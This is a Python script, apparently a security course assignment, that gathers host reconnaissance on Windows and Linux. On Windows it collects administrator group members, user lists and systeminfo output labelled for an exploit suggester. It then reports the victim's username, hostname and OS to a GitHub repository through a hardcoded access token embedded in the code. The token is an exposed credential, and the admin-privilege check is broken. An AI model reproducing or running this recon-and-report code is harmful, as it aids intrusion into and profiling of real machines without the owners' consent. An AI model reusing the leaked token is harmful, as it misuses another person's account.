class InformationCollector():
    def __init__(self, script_name):
        self.script_name = script_name
    
    def create_log(self,script_name,status):
        '''This function will create a log (succes/failed) depending on the script's results'''
        import socket
        import platform
        import base64
        import getpass
        import datetime
        from github import Github
        import datetime
        ACCESS_TOKEN ='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'
        FOLDER_PATH ='logs'
        current_datetime = datetime.datetime.now()
        content = f"Script Name: {script_name}\nExecution time: {current_datetime}\nStatus: {status}\n\n"
        username = getpass.getuser()
        hostname = socket.gethostname()
        os_name = platform.system()
        filename = os_name + "_" + hostname + "_" + username
        g = Github(ACCESS_TOKEN)
        repo = g.get_repo("rsecurity12/python_opdracht")
        
        try:
            existing_file = repo.get_contents(f"{FOLDER_PATH}/{filename}")
            sha = existing_file.sha
            existing_content = base64.b64decode(existing_file.content).decode()
            new_content = existing_content + '\n' + content
            repo.update_file(existing_file.path, "Update log", new_content, sha)
        except Exception as e:
            if 'Not Found' in str(e):
                new_file = repo.create_file(f"{FOLDER_PATH}/{filename}", "New log", content)
            else:
                pass

        
    def run_windows_info_collector(self):
        '''This function performs a basic information gathering '''
        import ctypes
        import subprocess
        import os
        output_file = r"C:\Users\Public\gather_info.txt"
        screenshot_path = r"C:\Users\Public\gather_info"
        if not os.path.exists(screenshot_path):
            os.makedirs(screenshot_path)   
        output_file = open(r"C:\Users\Public\gather_info\windows_info.txt", "w")      
        gather_admin_result = subprocess.run(["net", "localgroup", "administrators"], capture_output=True, text=True)
        gather_user_result = subprocess.run(["net", "users"], capture_output=True, text=True)
        systeminfo = subprocess.run(['systeminfo'], capture_output=True, text=True)
        try:
            ctypes.windll.shell32.IsUserAnAdmin() != 0
            output_file.write("Administrative privileges:\nUser has administrative privileges\n\n")
        except:
            output_file.write("Administrative privileges:\nUser does not have administrative privileges\n\n")   
        output_file.write(f"Admin group:\n{gather_admin_result.stdout}\n\n")    
        output_file.write(f"Users in the target:{gather_user_result.stdout}\n\n") 
        output_file.write(f"Systeminfo output for suggester:\n{systeminfo.stdout}")
        output_file.close()
        
    def run_linux_info_collector(self):
        '''This function performs basic information gathering on a Linux system'''
        import subprocess
        import os
        output_file = "/tmp/gather_info.txt"
        screenshot_path = "/tmp/gather_info"
    
        if not os.path.exists(screenshot_path):
            os.makedirs(screenshot_path)
    
        output_file = open("/tmp/gather_info/linux_info.txt", "w")
    
        uname = subprocess.run(['uname', '-a'], capture_output=True, text=True)
        df = subprocess.run(['df', '-h'], capture_output=True, text=True)
        lspci = subprocess.run(['lspci'], capture_output=True, text=True)
    
        output_file.write(f"uname -a output:\n{uname.stdout}\n\n")
        output_file.write(f"df -h output:\n{df.stdout}\n\n")
        output_file.write(f"lspci output:\n{lspci.stdout}\n\n")
    
        output_file.close()
        
    def run(self):
        import platform
        system = platform.system()
        if system == "Linux":
           self.run_linux_info_collector()
        elif system == "Windows":
            self.run_windows_info_collector()

      
info = InformationCollector("information Collector")
info.run()

try:
    info.run()
    info.create_log(info.script_name,"success")
except:
    info.create_log(info.script_name,"failed")